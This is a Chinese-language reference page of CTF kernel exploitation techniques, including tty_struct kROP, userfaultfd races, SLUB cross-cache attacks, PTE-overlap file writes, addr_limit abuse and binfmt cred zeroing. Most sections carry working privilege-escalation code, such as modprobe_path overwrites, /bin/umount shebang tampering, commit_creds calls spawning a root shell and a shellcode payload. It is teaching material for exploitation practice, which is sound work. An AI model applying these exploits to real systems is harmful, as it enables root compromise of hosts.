---

phase: binary
vuln_class: [pwn, kernel, heap, race, privesc]
title: 内核利用进阶手法
summary: 内核题的瓶颈不在「有没有洞」，在「手上是哪种原语、能不能稳定命中」。判据是先定原语类型（AAW/UAF/竞态/越界），再按 SLUB 与 CPU 归属挑桥接手法。
---

# 内核利用进阶手法

内核基础（环境搭建、堆喷结构、栈溢出、提权、`modprobe_path`、`core_pattern`）见 [[binary/漏洞利用/kernel.md|内核基础]]；保护绕过（KASLR/FGKASLR/KPTI/SMEP/SMAP）、GDB 调试、initramfs 流程与模板见 [[binary/漏洞利用/kernel-bypass.md|保护绕过]]；用户态堆手法见 [[binary/漏洞利用/heap-techniques.md|堆利用]]。

## 0. 判据速查

| 手上的原语 | 第一步做什么 | 去哪节 |
|---|---|---|
| 能连续写 `tty_struct` 前 0x200 字节 | 伪造 vtable 做 kROP，或改 `modprobe_path` | §1 |
| 竞态窗口太窄，命中率低 | 先上 userfaultfd 把它变成确定性 | §2 |
| 释放后的 chunk 里 freelist 指针读不出来 | 指针被搬到了对象中部 | §3 |
| 目标对象在专用 `kmem_cache` 里，喷不进去 | 跨 CPU 释放把整页还给 buddy | §4 |
| 能拿到一个物理页当 PTE 用 | 与文件映射重叠 → 任意文件写 | §5 |
| 内核操作要遍历大量用户页 | `MADV_DONTNEED` + `mprotect` 拖成几十秒 | §6 |
| KASLR 关着、有 RIP 控制、flag 在 initramfs | 跳到 flag 地址让 panic 打印出来 | §7 |
| 模块调 `set_fs(KERNEL_DS)` 后错误路径提前返回 | 故意让 `filp_open` 失败 | §8 |
| 目标是自定义 `binfmt` 加载器 | 在 `install_exec_creds` 之前动 `bprm` | §9 |

---

## 1. tty_struct 劫持与 kROP

### 判据

能对 `tty_struct` 做**连续写**（至少 0x200 字节），且 `ptmx` 可开。这是最经典的「有写原语但没有任意地址写」的桥接目标。

### 两阶段 kROP

```text
tty_struct 布局（做 kROP 用）：
  +0x00  magic, kref  -> 0x5401（必须保留，否则 paranoia 检查直接拒）
  +0x08  dev          -> `pop rsp` gadget 的地址
  +0x10  driver       -> &tty_struct + 0x170（栈枢轴目标，必须是合法 kheap 地址）
  +0x18  ops          -> &tty_struct + 0x50（指向伪造 vtable）
  ...
  +0x50               -> 伪造 vtable（0x120 字节），ioctl 项填 `leave` gadget
  ...
  +0x170              -> 真正的 ROP 链（commit_creds / prepare_kernel_cred）
```

执行流：

1. `ioctl(ptmx_fd, cmd, arg)` → `tty_ioctl()`，paranoia 检查通过（`magic=0x5401`）
2. `tty->ops->ioctl()` → 跳到伪造 vtable 里的 `leave`
3. `leave` = `mov rsp, rbp; pop rbp`；此刻 **RBP 正好指向 `tty_struct` 自身**
4. RSP 落到 `tty_struct + 0x08`（即 `dev` 字段）
5. `ret` 到 `dev` 里的 `pop rsp` gadget，弹出 `driver` 作为新 RSP
6. RSP 到 `tty_struct + 0x170`，ROP 链开始跑

**关键**：vtable 调用发生时 RBP 指向结构体自身，`leave` 天然完成第一次枢轴；第二次靠 `pop rsp` 跳到链区。两次缺一不可——只用 `leave` 会落在 `dev` 字段上把它当代码执行。

### 更省事的替代：`push rdx` 直接枢轴

很多内核在固定偏移处有 `push rdx; ... pop rsp; ... ret`，而 `ioctl` 的第三个参数**完全落在 RDX**：

```c
// ioctl(fd, cmd, arg) -> RDX = arg（64 位全控）
// gadget: push rdx; mov ebp, imm; pop rsp; pop r13; pop rbp; ret
ioctl(ptmx_fd, 0, (unsigned long)rop_chain_addr);   // RSP 直接到用户指定地址
```

**判据**：先 `ROPgadget --binary vmlinux | grep "push rdx"` 扫一遍，命中就不必费劲伪造整个 `tty_struct`。

### AAW：只改 `modprobe_path`

不需要完整 kROP 时，用 `tty_struct` 做 4 字节粒度任意写。

`ioctl` 的寄存器控制：
- `cmd`（32 位）→ 部分控制 RBX / RCX / RSI
- `arg`（64 位）→ 全控 RDX / R8 / R12

伪造 vtable 里填写 gadget：`mov DWORD PTR [rdx], esi; ret`

```c
// 一次 ioctl 写 4 字节，4 次写完 "/tmp/evil.sh"
for (int i = 0; i < 4; i++) {
    uint32_t val = *(uint32_t*)("/tmp/evil.sh\0\0\0\0" + i * 4);
    ioctl(ptmx_fd, val, modprobe_path_addr + i * 4);
}
```

**坑**：`cmd` 只有 32 位，写 `esi` 时高 32 位不受控；要写 8 字节就得拆成两次 4 字节。

---

## 2. userfaultfd：把竞态变确定性

### 原理

`uffd` 让内核线程在访问未映射页时**阻塞**，把「靠运气命中」变成「由用户态决定何时继续」。

1. `mmap(MAP_PRIVATE)` 一块区域（此时无物理页）
2. `ioctl(UFFDIO_REGISTER)` 注册
3. 内核访问该区域（如 `copy_from_user()`）→ 缺页
4. 内核线程阻塞，等用户态处理
5. **阻塞期间**用户态自由修改共享状态（释放对象、喷堆）
6. `ioctl(UFFDIO_COPY)` 补页，内核线程继续

```c
int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API, .features = 0 };
ioctl(uffd, UFFDIO_API, &api);

void *region = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = {
    .range = { .start = (unsigned long)region, .len = 0x1000 },
    .mode = UFFDIO_REGISTER_MODE_MISSING
};
ioctl(uffd, UFFDIO_REGISTER, &reg);

void *handler(void *arg) {
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };
    while (poll(&pfd, 1, -1) > 0) {
        struct uffd_msg msg;
        read(uffd, &msg, sizeof(msg));
        // >>> 竞态窗口：内核线程停在这里 <<<
        // 释放目标对象、喷堆……

        struct uffdio_copy copy = {
            .dst = msg.arg.pagefault.address & ~0xFFF,
            .src = (unsigned long)src_page,
            .len = 0x1000
        };
        ioctl(uffd, UFFDIO_COPY, &copy);   // 放行
    }
}
```

### 跨页拆分对象

把一个内核对象摆到页边界上：第一页正常，第二页触发 uffd。内核处理完前半段、在后半段阻塞——**窗口落在操作中途**，这正是 UAF 需要的时机。

### uffd 被禁时的替代

`CONFIG_USERFAULTFD` 关闭，或仅 root 可用：

1. **超大 `copy_from_user()` 缓冲区**：拷贝本身变慢，窗口被拉宽
2. **绑核 + 重系统调用**：竞争线程钉同一个核，用耗时内核函数延长窗口
3. **纯暴力重试**：命中率 1%-50%，看时序
4. **TSC 计时（Context Conservation）**：进临界区前循环读 TSC，确认自己处在 CFS 时间片开头，减少被抢占概率

**判据**：先看 `/proc/sys/vm/unprivileged_userfaultfd`；为 0 就走替代路线，别在 `syscall` 返回 `EPERM` 上耗轮次。

---

## 3. SLUB 分配器内部

### freelist 指针位置（5.7+）

释放指针被放在对象**中部**（字对齐），不再在 offset 0：

```c
// mm/slub.c
if (freepointer_area > sizeof(void *))
    s->offset = ALIGN(freepointer_area / 2, sizeof(void *));
```

**影响**：从 chunk 开头做的溢出**够不到** freelist；从相邻 chunk 的 underflow 反而可能命中。做题先确认目标内核版本，再决定溢出方向。

### freelist 混淆（`CONFIG_SLAB_FREELIST_HARDENED`）

```text
stored_ptr = real_ptr ^ kmem_cache->random ^ swab(ptr_addr)
```

**检测**：GDB 里找 `kmem_cache_cpu`（经 `$GS_BASE + kmem_cache.cpu_slab` 偏移），跟 `freelist` 指针，看存的值像不像合法内核地址。不像 = 混淆开着。

**绕过**：需要 `random` 值本身，或改用不依赖 freelist 的手法（混淆只挡「伪造 next 指针」，挡不住 UAF 后原地改对象内容）。

---

## 4. 跨缓存攻击：CPU 分裂

### 判据

目标对象在**专用 `kmem_cache`**（不是 `kmalloc-*`），同缓存喷堆无效——回收的页永远留在那个 cache 里。

### 手法

利用 SLUB 的**按 CPU 分配/释放**特性，把页从专用 cache 逼回 buddy：

1. **在 CPU 0 分配 N 个对象** → 填满 CPU 0 的 partial 链
2. **在 CPU 1 释放同一批对象** → 落到 CPU 1 的 partial 链（不是 CPU 0 的）
3. CPU 1 的 partial 链溢出 → 转给 **node partial 链**
4. 完全空的 slab 被还给 **PCP（per-CPU page）链**，再回到 **buddy**
5. 用别的对象类型（如页表）重新占用这些页

```c
cpu_set_t set;
CPU_ZERO(&set); CPU_SET(0, &set);
sched_setaffinity(0, sizeof(set), &set);

for (int i = 0; i < MAX_ENTRIES; i++)          // 在 CPU 0 分配（填 ~3 个 slab 页）
    ioctl(fd, ALLOC_ENTRY, &entries[i]);

CPU_SET(1, &set);
sched_setaffinity(0, sizeof(set), &set);

for (int i = 0; i < MAX_ENTRIES; i++)          // 在 CPU 1 释放
    ioctl(fd, FREE_ENTRY, &entries[i]);
// 空 slab 流向：CPU1 partial → node partial → PCP → buddy
```

**关键**：分配与释放**跨 CPU** 才会换 partial 链；同一 CPU 上释放只是原地回填，永远出不了这个 cache。这是对付 `kmem_cache_create()` 自建缓存的唯一通用手段。

**坑**：分配数量必须够填满至少一整页 slab 且让 partial 溢出，数量不足就停在 CPU 1 的 partial 里不动。

---

## 5. PTE 重叠：任意文件写

### 判据

已经能拿到一个**被释放后又被当成页表页**的物理页（通常接在 §4 之后）。

### 手法

PTE 页只是普通物理页被页表分配器征用。一旦重叠，匿名映射与文件映射可以指向**同一物理页**：

1. 跨缓存 double-free 把页还到 buddy
2. 新建匿名映射 → 内核把该页当 PTE 页
3. 把只读文件（如 `/bin/umount`）映射进同一 PTE 区域
4. 损坏的 PTE 页现在含有指向文件物理页的项
5. 通过匿名（可写）侧写 → 直接改文件内容
6. 覆盖 shebang / ELF 头 → 执行攻击者脚本

```c
// 1. 匿名映射占下这页当 PTE 存储
char *anon = mmap(NULL, PAGE_SIZE * 512, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
for (int i = 0; i < 512; i++)           // 触碰，让 PTE 真正落进这页
    anon[i * PAGE_SIZE] = 'A';

// 2. 文件映射到重叠的虚拟区间
int file_fd = open("/bin/umount", O_RDONLY);
char *file_map = mmap(target_addr, PAGE_SIZE, PROT_READ,
                      MAP_PRIVATE | MAP_FIXED, file_fd, 0);

// 3. 经匿名侧写，改的是文件页
memcpy(anon + offset, "#!/tmp/pwn\n", 11);

// 4. 执行被改过的二进制 → 以 root 跑脚本
system("/bin/umount /tmp 2>/dev/null");
```

**关键**：写发生在**物理页层面**，绕过所有文件权限检查——不需要任何内核写原语。这是「只有 double-free、没有任意写」时最值钱的升级路径。

---

## 6. 竞态窗口扩展：`MADV_DONTNEED` + `mprotect`

### 判据

模块的 check 与 delete 之间有 TOCTOU，但窗口只有毫秒级，怎么调线程都命中不了。

### 手法

让内核在长耗时操作中**反复缺页**，把窗口从毫秒拉到几十秒：

1. 让内核的检查操作读取用户页（如 `sha256_va_range()` 算哈希）
2. 另一线程循环 `MADV_DONTNEED`（丢 PTE）+ `mprotect()`（翻转权限）
3. 每次缺页都强制获取 VMA 锁并走缺页处理
4. 内核操作被反复打断，窗口持续敞开

```c
// 线程 1：触发有漏洞的 CHECK ioctl（长耗时哈希）
ioctl(fd, CHECK_ENTRY, &entry);

// 线程 2：靠反复缺页延长窗口
while (racing) {
    madvise(buf, PAGE_SIZE, MADV_DONTNEED);              // 丢 PTE
    mprotect(buf, PAGE_SIZE, PROT_READ);                 // 下次访问必缺页
    mprotect(buf, PAGE_SIZE, PROT_READ | PROT_WRITE);    // 复原
}

// 线程 3：并发触发 DEL ioctl
ioctl(fd, DEL_ENTRY, &entry);
```

**关键**：`MADV_DONTNEED` 只丢 PTE、不释放物理页；内核再访问就必然缺页重映射。配上 `mprotect` 翻转造成锁竞争，任何触碰用户页的内核操作都会被拖慢几个数量级。

---

## 7. 内核 panic 泄漏

### 判据

KASLR 关闭（或布局已知）+ 用 initramfs（flag 已读进内核内存）+ 有 RIP 控制。

```nasm
jmp &flag     ; 直接跳到 flag 内容所在的地址
```

内核 panic，panic 消息的 `CODE` 段会打印出错指令的字节——这些字节就是 flag。

**坑**：只有 `initramfs` 才成立（flag 在内存里）；从磁盘挂载的 rootfs 里没有。panic 输出需要能读到（串口/`dmesg`），否则白跳。

---

## 8. `addr_limit` 未恢复

### 判据

模块为读内核指针临时 `set_fs(KERNEL_DS)`，但错误路径**提前 return 且没还原**。

### 手法

故意让后续 `filp_open()` 失败（把目标路径做成目录 → `-EISDIR`），走错误路径，`addr_limit` 就永久停在 `KERNEL_DS`。之后普通 `read()`/`write()` 就能读写内核地址。

```c
#define DEBUG_FILE "/tmp/debug_log"
#define SYS_TABLE_ADDR 0xffffffff81801400    // 从 /proc/kallsyms 取

mkdir(DEBUG_FILE, 0);                        // 让 filp_open 失败

int fd = open("/dev/vuln_module", O_RDWR);
read(fd, &c, 1);                             // 触发 debug_msg()，addr_limit 停在 KERNEL_DS

// 用 pipe 当内核内存读写原语
int pipefd[2]; pipe(pipefd);

unsigned long pkc = 0xffffffff810a9ef0;      // prepare_kernel_cred
write(pipefd[1], &pkc, sizeof(pkc));
read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 100), sizeof(unsigned long));

unsigned long cc = 0xffffffff810a9d80;       // commit_creds
write(pipefd[1], &cc, sizeof(cc));
read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 101), sizeof(unsigned long));

int creds = syscall(100, 0);                 // prepare_kernel_cred(0)
syscall(101, creds);                         // commit_creds(creds)
system("/bin/sh");
```

**关键**：`pipe` 的 `read`/`write` 走 `copy_to_user`/`copy_from_user`，在 `addr_limit = KERNEL_DS` 下不再检查目标地址是否在用户空间——这就是「普通系统调用变成内核任意读写」的原理。

**审计口径**：查模块所有 `set_fs()` 的配对；错误路径漏还原是最常见的一类。

---

## 9. 自定义 binfmt 加载器

### 判据

模块注册了 `binfmt` 处理器（识别特定魔数如 `"P4"`），且在 `install_exec_creds()` **之前**解析攻击者提供的头部。

这个窗口极其值钱：此时 `bprm->cred` 已分配但**尚未提交**，任何能改它的原语都直接等于提权。

### 两个典型缺口

1. **`header_offset` 未校验** → 当指针偏移打进 `bprm->buf[]`，越界读到内核侧 `linux_binprm`（含 `struct cred *cred`）
2. **`loads[i].addr | 8` 走另一分支** → 用完全可控的参数调 `_clear_user(addr, length)`，即任意地址清零

```python
from pwn import *

# 阶段 1：用 OOB header_offset 泄漏 bprm->cred
# load_count=5, header_offset=0x80-0x18 -> loads[] 从 bprm->buf 之后的字段解析
leak = b'P4' + p8(0) + p8(1) + p32(5) + p64(0x80 - 0x18) + p64(0)
# 执行后 dmesg 里的 "vm_mmap(..., length=<cred_addr>, ...)" 就暴露了 cred 指针

# 阶段 2：用 clear_user 把 cred 里的 uid/gid/suid/sgid/euid/egid/fsuid/fsgid 清零
cred = 0xffff...                             # 来自泄漏
entries  = p64(0x7000000 | 7) + p64(0x1000) + p64(0)        # 拿一页 RWX 放 shellcode
entries += p64((cred + 0x10) | 8) + p64(0x48) + p64(0)      # clear_user(cred->uid..fsgid)
binary   = b'P4' + p8(0) + p8(1) + p32(2) + p64(0x18) + p64(0x7000090) + entries
binary   = binary.ljust(0x7000090 & 0xfff, b'\x00') + asm(shellcraft.sh())
# exec -> install_exec_creds 看到一个 uid=0 的 cred -> 直接 root
```

**关键**：不需要传统的内核内存破坏链。任何在 `install_exec_creds` 之前触碰 `bprm` 的原语（OOB 读泄漏 `bprm->cred`、`_clear_user` 清零 cred 字段、`vm_mmap` 拿 RWX）都能组合成提权。

**审计口径**：看自定义模块的 `load_*_binary()`：
- (a) `header_offset` 与 `load_count` 有没有边界
- (b) 传给 `_clear_user`/`copy_to_user` 的 `addr`/`length` 有没有 `access_ok`/范围检查
- (c) `printk` 有没有顺带泄漏地址

---

## 10. 纪律

- **先定原语，再选手法**。有 AAW 就直接改 `modprobe_path`，别硬做 kROP；有 double-free 就先想跨缓存，别原地喷。
- **版本决定一切**：SLUB freelist 位置（5.7 分界）、`FREELIST_HARDENED`、`userfaultfd` 权限、`CONFIG_STATIC_USERMODEHELPER`——先 `uname -a` 与 `/boot/config-*`，再谈手法。
- **竞态先稳定再优化**：命中率 5% 的利用不要急着调参，先看能不能上 uffd 变确定性。
- **跨 CPU 是逃出专用 cache 的唯一路**：同 CPU 释放永远原地回填。
- **提权优先挑「不需要写内核内存」的路径**：PTE 重叠改文件、`addr_limit` 未恢复、`binfmt` 改 cred，都比构造完整 ROP 链省事。
- **报的是原语不是漏洞名**：题目给的是 UAF / OOB / 竞态，解法取决于能把它变成什么，而不是它叫什么。
